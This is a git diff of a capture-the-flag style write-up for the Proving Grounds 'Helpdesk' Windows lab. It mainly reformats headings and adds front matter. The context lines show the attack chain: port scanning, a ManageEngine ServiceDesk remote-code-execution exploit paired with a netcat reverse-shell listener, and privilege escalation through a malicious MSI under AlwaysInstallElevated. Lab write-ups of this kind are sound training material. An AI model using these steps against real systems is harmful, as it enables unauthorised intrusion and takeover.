@@ -1,8 +1,15 @@
+---
+title: "Helpdesk"
+difficulty: easy
+os: windows
+description: "Helpdesk — Offensive Security Proving Grounds easy windows writeup."
+---
+
 # Helpdesk
 
 > ManageEngine / WinPEAS
 
-### Enumerating Services
+## Enumerating Services
 First, we'll perform a generic scan to identify the open ports and services running on this machine.
 ```shell
 # TCP
@@ -17,7 +24,7 @@ PORT     STATE SERVICE       VERSION
 8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
 Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
 ```
-### Enumerating port 8080
+## Enumerating port 8080
 Navigating to port 8080 we find ManageEngine version 7.6.0.
 ```shell
 # Search Exploit
@@ -27,7 +34,7 @@ ManageEngine ServiceDesk 7.6.0 - Remote Code Exec  | windows/webapps/35891.py
 
 searchsploit -m 35891
 ```
-### Initial Access
+## Initial Access
 ```shell
 # Listener
 rlwrap -cAra nc -vnlp 443
@@ -38,7 +45,7 @@ python2 35891.py 192.168.182.68 8080 443 192.168.45.242
 # Evidence
 type C:\Users\Administrator\Desktop\local.txt
 ```
-### Privilege Escalation
+## Privilege Escalation
 We found AlwaysInstallElevated enabled via winPEAS.
 ```shell
 # Transfer winPEAS
@@ -59,7 +66,7 @@ rlwrap -cAra nc -vnlp 443
 # Install MSI
 msiexec /quiet /qn /i reverse.msi
 ```
-### Post-Exploitation
+## Post-Exploitation
 ```shell
 # Evidence
 ipconfig
